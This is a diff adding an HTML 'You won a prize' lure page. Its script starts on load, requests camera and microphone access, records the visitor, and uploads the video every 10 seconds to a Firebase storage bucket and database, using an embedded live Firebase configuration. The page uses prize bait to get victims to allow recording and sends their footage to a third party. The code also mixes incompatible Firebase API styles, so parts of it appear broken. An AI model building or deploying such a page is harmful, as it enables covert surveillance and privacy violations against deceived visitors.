@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lucky Winner 🎉</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('https://source.unsplash.com/1600x900/?celebration,fireworks') no-repeat center center/cover;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 4em;
+            margin-bottom: 10px;
+        }
+
+        .message {
+            font-size: 1.5em;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🎉 YOU WON A PRIZE! 🎉</h1>
+    <p class="message">Video is recording, and will be uploaded every 10 seconds!</p>
+
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Настроим камеру для записи
+        async function startRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
+                mediaRecorder.start();
+
+                // Запись видео на протяжении всей сессии
+                console.log("Recording started...");
+                
+                // Отправляем видео каждые 10 секунд
+                setInterval(() => {
+                    if (recordedChunks.length > 0) {
+                        sendVideoToFirebase(); // Отправляем записанные данные в Firebase
+                    }
+                }, 10000);
+
+            } catch (error) {
+                console.error("Camera access denied:", error);
+            }
+        }
+
+        async function sendVideoToFirebase() {
+            if (recordedChunks.length === 0) return; // Если нет данных, не отправляем
+
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            console.log("Видео создано, начинаем загрузку...");
+
+            const storage = firebase.storage();
+            const storageRef = storage.ref();
+            const videoRef = storageRef.child('videos/video_' + Date.now() + '.webm');
+
+            try {
+                // Загружаем видео в Firebase Cloud Storage
+                console.log("Загружаем видео в Firebase...");
+                await videoRef.put(blob);
+
+                // Получаем URL видео после загрузки
+                const videoURL = await videoRef.getDownloadURL();
+                console.log("Видео загружено! URL:", videoURL);
+
+                // Сохраняем ссылку на видео в Firebase Realtime Database
+                const database = firebase.database();
+                const tiktokRef = ref(database, 'social_media/camera');
+                const newEntry = push(tiktokRef); // Генерация уникального ключа для записи
+                await set(newEntry, {
+                    videoUrl: videoURL,
+                    timestamp: Date.now(),
+                });
+
+                console.log("Метаданные видео сохранены в базе данных!");
+
+                // Очищаем записи после загрузки
+                recordedChunks = [];
+
+            } catch (error) {
+                console.error("Ошибка при загрузке видео:", error);
+            }
+        }
+
+        // Начинаем запись видео при загрузке страницы
+        startRecording();
+    </script>
+
+    <!-- Подключение Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+        import { getStorage } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-storage.js";
+        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA5UGxuO54bJOOhFW5w80eQLCPYc8XDlWg",
+            authDomain: "snaf-cd0cf.firebaseapp.com",
+            databaseURL: "https://snaf-cd0cf-default-rtdb.firebaseio.com",
+            projectId: "snaf-cd0cf",
+            storageBucket: "snaf-cd0cf.appspot.com",
+            messagingSenderId: "866265305755",
+            appId: "1:866265305755:web:832bb14ce2fa65fcbeec3e",
+            measurementId: "G-9FGYBRMG7G"
+        };
+
+        const app = initializeApp(firebaseConfig);
+    </script>
+
+</body>
+</html>
